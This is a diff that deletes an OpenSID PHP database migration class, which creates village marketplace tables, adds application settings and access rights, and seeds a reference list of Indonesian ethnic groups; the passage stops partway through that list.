@@ -1,712 +1,673 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-class Migrasi_fitur_premium_2107 extends MY_Model
-{
-    public function up()
-    {
-        $hasil = true;
-
-        // Jalankan migrasi sebelumnya
-        $hasil = $hasil && $this->jalankan_migrasi('migrasi_fitur_premium_2106');
-
-        $hasil = $hasil && $this->migrasi_2021060851($hasil);
-        $hasil = $hasil && $this->migrasi_2021060901($hasil);
-        $hasil = $hasil && $this->migrasi_2021061201($hasil);
-        $hasil = $hasil && $this->migrasi_2021061301($hasil);
-        $hasil = $hasil && $this->migrasi_2021061651($hasil);
-        $hasil = $hasil && $this->migrasi_2021061652($hasil);
-        $hasil = $hasil && $this->migrasi_2021061653($hasil);
-        $hasil = $hasil && $this->migrasi_2021061951($hasil);
-        $hasil = $hasil && $this->migrasi_2021062051($hasil);
-        $hasil = $hasil && $this->migrasi_2021062052($hasil);
-        $hasil = $hasil && $this->migrasi_2021062053($hasil);
-        $hasil = $hasil && $this->migrasi_2021062152($hasil);
-        $hasil = $hasil && $this->migrasi_2021062154($hasil);
-        $hasil = $hasil && $this->migrasi_2021062371($hasil);
-
-        return $hasil && $this->migrasi_2021062373($hasil);
-    }
-
-    protected function migrasi_2021060851($hasil)
-    {
-        if (! $this->db->field_exists('id_peta', 'persil')) {
-            $hasil = $hasil && $this->dbforge->add_column('persil', 'id_peta int(60)'); // tambah id peta untuk menyimpan id area
-        }
-
-        if (! $this->db->field_exists('id_peta', 'mutasi_cdesa')) {
-            $hasil = $hasil && $this->dbforge->add_column('mutasi_cdesa', 'id_peta int(60)'); // tambah id peta untuk menyimpan id area
-        }
-
-        return $hasil;
-    }
-
-    protected function migrasi_2021060901($hasil)
-    {
-        $hasil = $hasil && $this->tambah_table_pelapak($hasil);
-        $hasil = $hasil && $this->tambah_table_produk_kategori($hasil);
-        $hasil = $hasil && $this->tambah_table_produk($hasil);
-        $hasil = $hasil && $this->tambah_modul_produk($hasil);
-        $hasil = $hasil && $this->tambah_folder_produk($hasil);
-
-        return $hasil && $this->tambah_pengaturan_aplikasi($hasil);
-    }
-
-    // Tabel Pelapak
-    protected function tambah_table_pelapak($hasil)
-    {
-        $fields = [
-            'id' => [
-                'type'           => 'INT',
-                'constraint'     => 11,
-                'auto_increment' => true,
-            ],
-
-            'id_pend' => [
-                'type'       => 'TINYINT',
-                'constraint' => 11,
-                'null'       => true,
-                'default'    => null,
-            ],
-
-            'telepon' => [
-                'type'       => 'VARCHAR',
-                'constraint' => 20,
-                'null'       => true,
-            ],
-
-            'lat' => [
-                'type'       => 'VARCHAR',
-                'constraint' => 20,
-                'null'       => true,
-            ],
-
-            'lng' => [
-                'type'       => 'VARCHAR',
-                'constraint' => 20,
-                'null'       => true,
-            ],
-
-            'zoom' => [
-                'type'       => 'TINYINT',
-                'constraint' => 4,
-                'null'       => true,
-            ],
-
-            'status' => [
-                'type'       => 'TINYINT',
-                'constraint' => 1,
-                'default'    => 1,
-            ],
-        ];
-
-        $this->dbforge->add_key('id', true);
-        $this->dbforge->add_field($fields);
-
-        return $hasil && $this->dbforge->create_table('pelapak', true);
-    }
-
-    // Tabel Produk Kategori
-    protected function tambah_table_produk_kategori($hasil)
-    {
-        $fields = [
-            'id' => [
-                'type'           => 'INT',
-                'constraint'     => 11,
-                'auto_increment' => true,
-            ],
-
-            'kategori' => [
-                'type'       => 'VARCHAR',
-                'constraint' => 50,
-                'default'    => null,
-            ],
-
-            'slug' => [
-                'type'       => 'VARCHAR',
-                'constraint' => 100,
-                'default'    => null,
-            ],
-        ];
-
-        $this->dbforge->add_key('id', true);
-        $this->dbforge->add_field($fields);
-
-        return $hasil && $this->dbforge->create_table('produk_kategori', true);
-    }
-
-    // Tabel Produk
-    protected function tambah_table_produk($hasil)
-    {
-        $fields = [
-            'id' => [
-                'type'           => 'INT',
-                'constraint'     => 11,
-                'auto_increment' => true,
-            ],
-
-            'id_pelapak' => [
-                'type'       => 'INT',
-                'constraint' => 11,
-                'null'       => true,
-                'default'    => null,
-            ],
-
-            'id_produk_kategori' => [
-                'type'       => 'INT',
-                'constraint' => 11,
-                'null'       => true,
-                'default'    => null,
-            ],
-
-            'nama' => [
-                'type'       => 'VARCHAR',
-                'constraint' => 255,
-                'default'    => null,
-            ],
-
-            'harga' => [
-                'type'       => 'INT',
-                'constraint' => 11,
-                'default'    => null,
-            ],
-
-            'satuan' => [
-                'type'       => 'VARCHAR',
-                'constraint' => 20,
-                'default'    => null,
-            ],
-
-            'potongan' => [
-                'type'       => 'INT',
-                'constraint' => 11,
-                'default'    => 0,
-            ],
-
-            'deskripsi' => [
-                'type'    => 'TEXT',
-                'default' => null,
-            ],
-
-            'foto' => [
-                'type'       => 'VARCHAR',
-                'constraint' => 225,
-                'null'       => true,
-            ],
-
-            'status' => [
-                'type'       => 'TINYINT',
-                'constraint' => 1,
-                'default'    => 1,
-            ],
-
-            'created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP',
-            'updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP',
-        ];
-
-        $this->dbforge->add_key('id', true);
-        $this->dbforge->add_field($fields);
-        $hasil = $hasil && $this->dbforge->create_table('produk', true);
-
-        $hasil = $hasil && $this->tambah_foreign_key('lapak_fk', 'produk', 'id_pelapak', 'pelapak', 'id');
-
-        return $hasil && $this->tambah_foreign_key('produk_kategori_fk', 'produk', 'id_produk_kategori', 'produk_kategori', 'id');
-    }
-
-    // Menu Produk / Lapak
-    protected function tambah_modul_produk($hasil)
-    {
-        return $hasil && $this->tambah_modul([
-            'id'         => 324,
-            'modul'      => 'Lapak',
-            'url'        => 'lapak_admin',
-            'aktif'      => 1,
-            'ikon'       => 'fa-cart-plus',
-            'urut'       => 122,
-            'level'      => 2,
-            'hidden'     => 0,
-            'ikon_kecil' => 'fa-cart-plus',
-            'parent'     => 0,
-        ]);
-    }
-
-    protected function tambah_folder_produk($hasil)
-    {
-        $folder = 'upload/produk';
-        if (! file_exists('/desa/' . $folder)) {
-            mkdir('desa/' . $folder, 0755, true);
-            xcopy('desa-contoh/' . $folder, 'desa/' . $folder);
-        }
-
-        return $hasil;
-    }
-
-    // Menambahkan data ke setting_aplikasi
-    protected function tambah_pengaturan_aplikasi($hasil)
-    {
-        $hasil = $hasil && $this->db->query("
-			INSERT INTO `setting_aplikasi` (`key`, `value`, `keterangan`, `jenis`, `kategori`) VALUES ('tampilkan_lapak_web', '1', 'Aktif / Non-aktif Lapak di Halaman Website Url Terpisah', 'boolean', 'lapak') ON DUPLICATE KEY UPDATE `key` = VALUES(`key`), keterangan = VALUES(keterangan), jenis = VALUES(jenis), kategori = VALUES(kategori)");
-
-        $hasil = $hasil && $this->db->query("
-			INSERT INTO `setting_aplikasi` (`key`, `value`, `keterangan`, `jenis`, `kategori`) VALUES ('pesan_singkat_wa', 'Saya ingin membeli [nama_produk] yang anda tawarkan di Lapak Desa [link_web]', 'Pesan Singkat WhatsApp', 'textarea', 'lapak') ON DUPLICATE KEY UPDATE `key` = VALUES(`key`), keterangan = VALUES(keterangan), jenis = VALUES(jenis), kategori = VALUES(kategori)");
-
-        return $hasil && $this->db->query("
-			INSERT INTO `setting_aplikasi` (`key`, `value`, `keterangan`, `jenis`, `kategori`) VALUES ('banyak_foto_tiap_produk', 3, 'Banyaknya foto tiap produk yang bisa di unggah', 'int', 'lapak') ON DUPLICATE KEY UPDATE `key` = VALUES(`key`), keterangan = VALUES(keterangan), jenis = VALUES(jenis), kategori = VALUES(kategori)");
-    }
-
-    protected function migrasi_2021061201($hasil)
-    {
-        // Ubah nilai default zoom yang sudah ada
-        $hasil = $hasil && $this->db->where('zoom', null)->update('pelapak', ['zoom' => 10]);
-
-        // Ubah default nilai zoom table pelapak
-        $fields = [
-            'zoom' => [
-                'name'       => 'zoom',
-                'type'       => 'TINYINT',
-                'constraint' => 4,
-                'null'       => false,
-                'default'    => 10,
-            ],
-        ];
-
-        return $hasil && $this->dbforge->modify_column('pelapak', $fields);
-    }
-
-    protected function migrasi_2021061301($hasil)
-    {
-        // Ubah tipe data id_pend pada tabel pelapak
-        $fields = [
-            'id_pend' => [
-                'type'       => 'INT',
-                'constraint' => 11,
-            ],
-        ];
-
-        return $hasil && $this->dbforge->modify_column('pelapak', $fields);
-    }
-
-    // Menambahkan data ke setting_aplikasi
-    protected function migrasi_2021061651($hasil)
-    {
-        return $hasil && $this->db->query("
-			INSERT INTO `setting_aplikasi` (`key`, `value`, `keterangan`, `jenis`, `kategori`) VALUES ('jumlah_produk_perhalaman', '10', 'Jumlah produk yang ditampilkan dalam satu halaman', 'int', 'lapak') ON DUPLICATE KEY UPDATE `key` = VALUES(`key`), keterangan = VALUES(keterangan), jenis = VALUES(jenis), kategori = VALUES(kategori)");
-    }
-
-    protected function migrasi_2021061652($hasil)
-    {
-        // Ubah nilai default foto pada tabel user
-        $fields = [
-            'foto' => [
-                'name'       => 'foto',
-                'type'       => 'VARCHAR',
-                'constraint' => 100,
-                'default'    => 'kuser.png',
-            ],
-        ];
-
-        return $hasil && $this->dbforge->modify_column('user', $fields);
-    }
-
-    protected function migrasi_2021061653($hasil)
-    {
-        // Hapus table provinsi
-        return $hasil && $this->dbforge->drop_table('provinsi', true);
-    }
-
-    private function migrasi_2021061951($hasil)
-    {
-        // Tambah hak ases group operator dan redaksi
-        $query = '
-			INSERT INTO grup_akses (`id_grup`, `id_modul`, `akses`) VALUES
-			-- Operator --
-			(2,43,3), -- Aplikasi --
-			(2,44,1), -- Pengguna --
-			(2,45,3), -- Database --
-			(2,46,3), -- Info Sistem --
-
-			-- Redaksi --
-			(3,65,7), -- Kategori --
-			(3,324,7) -- Lapak --
-		';
-
-        return $hasil && $this->db->query($query);
-    }
-
-    protected function migrasi_2021062051($hasil)
-    {
-        $count = $this->db->like('path', '[[[[', 'AFTER')
-            ->like('path', ']]]]', 'BEFORE')
-            ->get('config')->num_rows();
-
-        if ($count == 0) {
-            //update data path menjadi [[[[x,y]]],[[[x,y]]]]
-            $hasil = $this->db->set('path', 'concat("[",path,"]")', false)
-                ->update('config');
-        }
-
-        //update data path pada dusun
-        return $hasil && $this->db
-            ->where('rt', '0')
-            ->where('rw', '0')
-            ->like('path', '[[[', 'AFTER')
-            ->not_like('path', '[[[[', 'AFTER')
-            ->set('path', 'concat("[",path,"]")', false)
-            ->update('tweb_wil_clusterdesa');
-    }
-
-    protected function migrasi_2021062052($hasil)
-    {
-        // Tambahkan id_cluster pada tweb_keluarga yg null
-        $query = '
-			update tweb_keluarga as k,
-				(select t.* from
-				   (select id, id_kk, id_cluster from tweb_penduduk where id_kk in
-					 (select id from tweb_keluarga where id_cluster is null)
-				   ) t
-				) as p
-				set k.id_cluster = p.id_cluster
-				where k.id = p.id_kk
-		';
-
-        $hasil = $hasil && $this->db->query($query);
-
-        // Perbaiki struktur table tweb_keluarga field id_cluster tdk boleh null
-        $fields = [
-            'id_cluster' => [
-                'name'       => 'id_cluster',
-                'type'       => 'INT',
-                'constraint' => 11,
-                'null'       => false,
-            ],
-        ];
-
-        return $hasil && $this->dbforge->modify_column('tweb_keluarga', $fields);
-    }
-
-    protected function migrasi_2021062053($hasil)
-    {
-        // Tambahkan id_cluster pada tweb_keluarga yg null
-        $query = '
-			update tweb_keluarga as k,
-				(select t.* from
-				   (select id, id_kk, id_cluster from tweb_penduduk where id_kk in
-				     (select id from tweb_keluarga where id_cluster is null)
-				   ) t
-				) as p
-				set k.id_cluster = p.id_cluster
-				where k.id = p.id_kk
-		';
-
-        $hasil = $hasil && $this->db->query($query);
-
-        // Perbaiki struktur table tweb_keluarga field id_cluster tdk boleh null
-        $fields = [
-            'id_cluster' => [
-                'name'       => 'id_cluster',
-                'type'       => 'INT',
-                'constraint' => 11,
-                'null'       => false,
-            ],
-        ];
-
-        return $hasil && $this->dbforge->modify_column('tweb_keluarga', $fields);
-    }
-
-    protected function migrasi_2021062152($hasil)
-    {
-        // Ubah struktur field potongan table produk
-        $fields = [
-            'potongan' => [
-                'name'       => 'potongan',
-                'type'       => 'INT',
-                'constraint' => 11,
-                'default'    => 0,
-            ],
-        ];
-
-        $hasil = $hasil && $this->dbforge->modify_column('produk', $fields);
-
-        if (! $this->db->field_exists('tipe_potongan', 'produk')) {
-            // Tambah field tipe_potongan pada table produk
-            // Tipe 1 = persen, 2 = nominal
-            $fields = [
-                'tipe_potongan' => [
-                    'type'       => 'TINYINT',
-                    'constraint' => 1,
-                    'default'    => 1,
-                ],
-            ];
-
-            $hasil = $hasil && $this->dbforge->add_column('produk', $fields, 'satuan');
-        }
-
-        return $hasil;
-    }
-
-    protected function migrasi_2021062154($hasil)
-    {
-        if (! $this->db->field_exists('status', 'produk_kategori')) {
-            // Tambah field status pada table produk_kategori
-            $fields = [
-                'status' => [
-                    'type'       => 'TINYINT',
-                    'constraint' => 1,
-                    'null'       => false,
-                    'default'    => 1,
-                ],
-            ];
-
-            $hasil = $hasil && $this->dbforge->add_column('produk_kategori', $fields);
-        }
-
-        return $hasil;
-    }
-
-    protected function migrasi_2021062371($hasil)
-    {
-        // Hapus key tampilkan_di_halaman_utama_web jika terlanjur migrasi (untuk tester)
-        return $hasil && $this->db->where('key', 'tampilkan_di_halaman_utama_web')->delete('setting_aplikasi');
-    }
-
-    protected function migrasi_2021062373($hasil)
-    {
-        // Tambah kolom suku pada tabel tweb_penduduk
-        if (! $this->db->field_exists('suku', 'tweb_penduduk')) {
-            $hasil = $hasil && $this->dbforge->add_column('tweb_penduduk', ['suku' => ['type' => 'VARCHAR', 'constraint' => '150', 'null' => true]]);
-        }
-
-        // Tambah tabel ref_penduduk_suku
-        if (! $this->db->table_exists('ref_penduduk_suku')) {
-            $fields = [
-                'id' => [
-                    'type'           => 'INT',
-                    'constraint'     => 65,
-                    'unsigned'       => true,
-                    'auto_increment' => true,
-                ],
-                'suku' => [
-                    'type'       => 'VARCHAR',
-                    'constraint' => 100,
-                ],
-                'deskripsi' => [
-                    'type' => 'TEXT',
-                ],
-            ];
-            $hasil = $hasil && $this->dbforge->add_field($fields);
-            $hasil = $hasil && $this->dbforge->add_key('id', true);
-            $hasil = $hasil && $this->dbforge->create_table('ref_penduduk_suku', true);
-        }
-
-        if ($hasil && $this->db->truncate('ref_penduduk_suku')) {
-
-            // Tambahkan data awal tabel ref_penduduk_suku
-            $insert_batch = [
-                ['suku' => 'Aceh', 'deskripsi' => 'Aceh'],
-                ['suku' => 'Alas', 'deskripsi' => 'Aceh'],
-                ['suku' => 'Alor', 'deskripsi' => 'NTT'],
-                ['suku' => 'Ambon', 'deskripsi' => 'Ambon'],
-                ['suku' => 'Ampana', 'deskripsi' => 'Sulawesi Tengah'],
-                ['suku' => 'Anak Dalam', 'deskripsi' => 'Jambi'],
-                ['suku' => 'Aneuk Jamee', 'deskripsi' => 'Aceh'],
-                ['suku' => 'Arab: Orang Hadhrami', 'deskripsi' => 'Arab: Orang Hadhrami'],
-                ['suku' => 'Aru', 'deskripsi' => 'Maluku'],
-                ['suku' => 'Asmat', 'deskripsi' => 'Papua'],
-                ['suku' => 'Bare’e', 'deskripsi' => 'Bare’e di Kabupaten Tojo Una-Una Tojo dan Tojo Barat'],
-                ['suku' => 'Banten', 'deskripsi' => 'Banten di Banten'],
-                ['suku' => 'Besemah', 'deskripsi' => 'Besemah di Sumatera Selatan'],
-                ['suku' => 'Bali', 'deskripsi' => "Bali\u{a0}di Bali terdiri dari: Suku Bali Majapahit di sebagian besar Pulau Bali; Suku Bali Aga di Karangasem dan Kintamani"],
-                ['suku' => 'Balantak', 'deskripsi' => 'Balantak di Sulawesi Tengah'],
-                ['suku' => 'Banggai', 'deskripsi' => 'Banggai di Sulawesi Tengah (Kabupaten Banggai Kepulauan)'],
-                ['suku' => 'Baduy', 'deskripsi' => "Baduy\u{a0}di Banten"],
-                ['suku' => 'Bajau', 'deskripsi' => 'Bajau di Kalimantan Timur'],
-                ['suku' => 'Banjar', 'deskripsi' => 'Banjar di Kalimantan Selatan'],
-                ['suku' => 'Batak', 'deskripsi' => 'Sumatera Utara'],
-                ['suku' => 'Batak Karo', 'deskripsi' => 'Sumatera Utara'],
-                ['suku' => 'Mandailing', 'deskripsi' => 'Sumatera Utara'],
-                ['suku' => 'Angkola', 'deskripsi' => 'Sumatera Utara'],
-                ['suku' => 'Toba', 'deskripsi' => 'Sumatera Utara'],
-                ['suku' => 'Pakpak', 'deskripsi' => 'Sumatera Utara'],
-                ['suku' => 'Simalungun', 'deskripsi' => 'Sumatera Utara'],
-                ['suku' => 'Batin', 'deskripsi' => 'Batin di Jambi'],
-                ['suku' => 'Bawean', 'deskripsi' => 'Bawean di Jawa Timur (Gresik)'],
-                ['suku' => 'Bentong', 'deskripsi' => 'Bentong di Sulawesi Selatan'],
-                ['suku' => 'Berau', 'deskripsi' => 'Berau di Kalimantan Timur (kabupaten Berau)'],
-                ['suku' => 'Betawi', 'deskripsi' => 'Betawi di Jakarta'],
-                ['suku' => 'Bima', 'deskripsi' => 'Bima NTB (kota Bima)'],
-                ['suku' => 'Boti', 'deskripsi' => 'Boti di kabupaten Timor Tengah Selatan'],
-                ['suku' => 'Bolang Mongondow', 'deskripsi' => 'Bolang Mongondow di Sulawesi Utara (Kabupaten Bolaang Mongondow)'],
-                ['suku' => 'Bugis', 'deskripsi' => "Bugis\u{a0}di Sulawesi Selatan: Orang Bugis Pagatan di Kalimantan Selatan, Kusan Hilir, Tanah Bumbu"],
-                ['suku' => 'Bungku', 'deskripsi' => 'Bungku di Sulawesi Tengah (Kabupaten Morowali)'],
-                ['suku' => 'Buru', 'deskripsi' => 'Buru di Maluku (Kabupaten Buru)'],
-                ['suku' => 'Buol', 'deskripsi' => 'Buol di Sulawesi Tengah (Kabupaten Buol)'],
-                ['suku' => 'Bulungan ', 'deskripsi' => 'Bulungan di Kalimantan Timur (Kabupaten Bulungan)'],
-                ['suku' => 'Buton', 'deskripsi' => 'Buton di Sulawesi Tenggara (Kabupaten Buton dan Kota Bau-Bau)'],
-                ['suku' => 'Bonai', 'deskripsi' => 'Bonai di Riau (Kabupaten Rokan Hilir)'],
-                ['suku' => 'Cham ', 'deskripsi' => 'Cham di Aceh'],
-                ['suku' => 'Cirebon ', 'deskripsi' => 'Cirebon di Jawa Barat (Kota Cirebon)'],
-                ['suku' => 'Damal', 'deskripsi' => 'Damal di Mimika'],
-                ['suku' => 'Dampeles', 'deskripsi' => 'Dampeles di Sulawesi Tengah'],
-                ['suku' => 'Dani ', 'deskripsi' => 'Dani di Papua (Lembah Baliem)'],
-                ['suku' => 'Dairi', 'deskripsi' => 'Dairi di Sumatera Utara'],
-                ['suku' => 'Daya ', 'deskripsi' => 'Daya di Sumatera Selatan'],
-                ['suku' => 'Dayak', 'deskripsi' => "Dayak\u{a0}terdiri dari: Suku Dayak Ahe di Kalimantan Barat; Suku Dayak Bajare di Kalimantan Barat; Suku Dayak Damea di Kalimantan Barat; Suku Dayak Banyadu di Kalimantan Barat; Suku Bakati di Kalimantan Barat; Suku Punan di Kalimantan Tengah; Suku Kanayatn di Kalimantan Barat; Suku Dayak Krio di Kalimantan Barat (Ketapang); Suku Dayak Sungai Laur di Kalimantan Barat (Ketapang); Suku Dayak Simpangh di Kalimantan Barat (Ketapang); Suku Iban di Kalimantan Barat; Suku Mualang di Kalimantan Barat (Sekada"],
-                ['suku' => 'Dompu', 'deskripsi' => 'Dompu NTB (Kabupaten Dompu)'],
-                ['suku' => 'Donggo', 'deskripsi' => 'Donggo, Bima'],
-                ['suku' => 'Dongga', 'deskripsi' => 'Donggala di Sulawesi Tengah'],
-                ['suku' => 'Dondo ', 'deskripsi' => 'Dondo di Sulawesi Tengah (Kabupaten Toli-Toli)'],
-                ['suku' => 'Duri', 'deskripsi' => 'Duri Terletak di bagian utara Kabupaten Enrekang berbatasan dengan Kabupaten Tana Toraja, meliputi tiga kecamatan induk Anggeraja, Baraka, dan Alla di Sulawesi Selatan'],
-                ['suku' => 'Eropa ', 'deskripsi' => 'Eropa (orang Indo, peranakan Eropa-Indonesia, atau etnik Mestizo)'],
-                ['suku' => 'Flores', 'deskripsi' => 'Flores di NTT (Flores Timur)'],
-                ['suku' => 'Lamaholot', 'deskripsi' => 'Lamaholot, Flores Timur, terdiri dari: Suku Wandan, di Solor Timur, Flores Timur; Suku Kaliha, di Solor Timur, Flores Timur; Suku Serang Gorang, di Solor Timur, Flores Timur; Suku Lamarobak, di Solor Timur, Flores Timur; Suku Atanuhan, di Solor Timur, Flores Timur; Suku Wotan, di Solor Timur, Flores Timur; Suku Kapitan Belen, di Solor Timur, Flores Timur'],
-                ['suku' => 'Gayo', 'deskripsi' => 'Gayo di Aceh (Gayo Lues Aceh Tengah Bener Meriah Aceh Tenggara Aceh Timur Aceh Tamiang)'],
-                ['suku' => 'Gorontalo', 'deskripsi' => 'Gorontalo di Gorontalo (Kota Gorontalo)'],
-                ['suku' => 'Gumai ', 'deskripsi' => 'Gumai di Sumatera Selatan (Lahat)'],
-                ['suku' => 'India', 'deskripsi' => 'India, terdiri dari: Suku Tamil di Aceh, Sumatera Utara, Sumatera Barat, dan DKI Jakarta; Suku Punjab di Sumatera Utara, DKI Jakarta, dan Jawa Timur; Suku Bengali di DKI Jakarta; Suku Gujarati di DKI Jakarta dan Jawa Tengah; Orang Sindhi di DKI Jakarta dan Jawa Timur; Orang Sikh di Sumatera Utara, DKI Jakarta, dan Jawa Timur'],
-                ['suku' => 'Jawa', 'deskripsi' => 'Jawa di Jawa Tengah, Jawa Timur, DI Yogyakarta'],
-                ['suku' => 'Tengger', 'deskripsi' => "Tengger\u{a0}di Jawa Timur (Probolinggo, Pasuruan, dan Malang)"],
-                ['suku' => 'Osing ', 'deskripsi' => 'Osing di Jawa Timur (Banyuwangi)'],
-                ['suku' => 'Samin ', 'deskripsi' => 'Samin di Jawa Tengah (Purwodadi)'],
-                ['suku' => 'Bawean', 'deskripsi' => 'Bawean di Jawa Timur (Pulau Bawean)'],
-                ['suku' => 'Jambi ', 'deskripsi' => 'Jambi di Jambi (Kota Jambi)'],
-                ['suku' => 'Jepang', 'deskripsi' => 'Jepang di DKI Jakarta, Jawa Timur, dan Bali'],
-                ['suku' => 'Kei', 'deskripsi' => 'Kei di Maluku Tenggara (Kabupaten Maluku Tenggara dan Kota Tual)'],
-                ['suku' => 'Kaili ', 'deskripsi' => 'Kaili di Sulawesi Tengah (Kota Palu)'],
-                ['suku' => 'Kampar', 'deskripsi' => 'Kampar'],
-                ['suku' => 'Kaur ', 'deskripsi' => 'Kaur di Bengkulu (Kabupaten Kaur)'],
-                ['suku' => 'Kayu Agung', 'deskripsi' => 'Kayu Agung di Sumatera Selatan'],
-                ['suku' => 'Kerinci', 'deskripsi' => 'Kerinci di Jambi (Kabupaten Kerinci)'],
-                ['suku' => 'Komering ', 'deskripsi' => 'Komering di Sumatera Selatan (Kabupaten Ogan Komering Ilir, Baturaja)'],
-                ['suku' => 'Konjo Pegunungan', 'deskripsi' => 'Konjo Pegunungan, Kabupaten Gowa, Sulawesi Selatan'],
-                ['suku' => 'Konjo Pesisir', 'deskripsi' => 'Konjo Pesisir, Kabupaten Bulukumba, Sulawesi Selatan'],
-                ['suku' => 'Koto', 'deskripsi' => 'Koto di Sumatera Barat'],
-                ['suku' => 'Kubu', 'deskripsi' => 'Kubu di Jambi dan Sumatera Selatan'],
-                ['suku' => 'Kulawi', 'deskripsi' => 'Kulawi di Sulawesi Tengah'],
-                ['suku' => 'Kutai ', 'deskripsi' => 'Kutai di Kalimantan Timur (Kutai Kartanegara)'],
-                ['suku' => 'Kluet ', 'deskripsi' => 'Kluet di Aceh (Aceh Selatan)'],
-                ['suku' => 'Korea ', 'deskripsi' => 'Korea di DKI Jakarta'],
-                ['suku' => 'Krui', 'deskripsi' => 'Krui di Lampung'],
-                ['suku' => 'Laut,', 'deskripsi' => 'Laut, Kepulauan Riau'],
-                ['suku' => 'Lampung', 'deskripsi' => 'Lampung, terdiri dari: Suku Sungkai di Lampung; Suku Abung di Lampung; Suku Way Kanan di Lampung, Sumatera Selatan dan Bengkulu; Suku Pubian di Lampung; Suku Tulang Bawang di Lampung; Suku Melinting di Lampung; Suku Peminggir Teluk di Lampung; Suku Ranau di Lampung, Sumatera Selatan dan Sumatera Utara; Suku Komering di Sumatera Selatan; Suku Cikoneng di Banten; Suku Merpas di Bengkulu; Suku Belalau di Lampung; Suku Smoung di Lampung; Suku Semaka di Lampung'],
-                ['suku' => 'Lematang ', 'deskripsi' => 'Lematang di Sumatera Selatan'],
-                ['suku' => 'Lembak', 'deskripsi' => 'Lembak, Kabupaten Rejang Lebong, Bengkulu'],
-                ['suku' => 'Lintang', 'deskripsi' => 'Lintang, Sumatera Selatan'],
-                ['suku' => 'Lom', 'deskripsi' => 'Lom, Bangka Belitung'],
-                ['suku' => 'Lore', 'deskripsi' => 'Lore, Sulawesi Tengah'],
-                ['suku' => 'Lubu', 'deskripsi' => 'Lubu, daerah perbatasan antara Provinsi Sumatera Utara dan Provinsi Sumatera Barat'],
-                ['suku' => 'Moronene', 'deskripsi' => 'Moronene di Sulawesi Tenggara.'],
-                ['suku' => 'Madura', 'deskripsi' => 'Madura di Jawa Timur (Pulau Madura, Kangean, wilayah Tapal Kuda)'],
-                ['suku' => 'Makassar', 'deskripsi' => 'Makassar di Sulawesi Selatan: Kabupaten Gowa, Kabupaten Takalar, Kabupaten Jeneponto, Kabupaten Bantaeng, Kabupaten Bulukumba (sebagian), Kabupaten Sinjai (bagian perbatasan Kab Gowa), Kabupaten Maros (sebagian), Kabupaten Pangkep (sebagian), Kota Makassar'],
-                ['suku' => 'Mamasa', 'deskripsi' => 'Mamasa (Toraja Barat) di Sulawesi Barat: Kabupaten Mamasa'],
-                ['suku' => 'Manda', 'deskripsi' => 'Mandar Sulawesi Barat: Polewali Mandar'],
-                ['suku' => 'Melayu', 'deskripsi' => 'Melayu, terdiri dari Suku Melayu Tamiang di Aceh (Aceh Tamiang); Suku Melayu Riau di Riau dan Kepulauan Riau; Suku Melayu Deli di Sumatera Utara; Suku Melayu Jambi di Jambi; Suku Melayu Bangka di Pulau Bangka; Suku Melayu Belitung di Pulau Belitung; Suku Melayu Sambas di Kalimantan Barat'],
-                ['suku' => 'Mentawai', 'deskripsi' => 'Mentawai di Sumatera Barat (Kabupaten Kepulauan Mentawai)'],
-                ['suku' => 'Minahasa', 'deskripsi' => 'Minahasa di Sulawesi Utara (Kabupaten Minahasa), terdiri 9 subetnik : Suku Babontehu; Suku Bantik; Suku Pasan Ratahan'],
-                ['suku' => 'Ponosakan', 'deskripsi' => 'Ponosakan; Suku Tonsea; Suku Tontemboan; Suku Toulour; Suku Tonsawang; Suku Tombulu'],
-                ['suku' => 'Minangkabau', 'deskripsi' => 'Minangkabau, Sumatera Barat'],
-                ['suku' => 'Mongondow', 'deskripsi' => 'Mongondow, Sulawesi Utara'],
-                ['suku' => 'Mori', 'deskripsi' => 'Mori, Kabupaten Morowali, Sulawesi Tengah'],
-                ['suku' => 'Muko-Muko', 'deskripsi' => 'Muko-Muko di Bengkulu (Kabupaten Mukomuko)'],
-                ['suku' => 'Muna', 'deskripsi' => 'Muna di Sulawesi Tenggara (Kabupaten Muna)'],
-                ['suku' => 'Muyu', 'deskripsi' => 'Muyu di Kabupaten Boven Digoel, Papua'],
-                ['suku' => 'Mekongga', 'deskripsi' => 'Mekongga di Sulawesi Tenggara (Kabupaten Kolaka dan Kabupaten Kolaka Utara)'],
-                ['suku' => 'Moro', 'deskripsi' => 'Moro di Kalimantan Barat dan Kalimantan Utara'],
-                ['suku' => 'Nias', 'deskripsi' => 'Nias di Sumatera Utara (Kabupaten Nias, Nias Selatan dan Nias Utara dari dua keturunan Jepang dan Vietnam)'],
-                ['suku' => 'Ngada ', 'deskripsi' => 'Ngada di NTT: Kabupaten Ngada'],
-                ['suku' => 'Osing', 'deskripsi' => 'Osing di Banyuwangi Jawa Timur'],
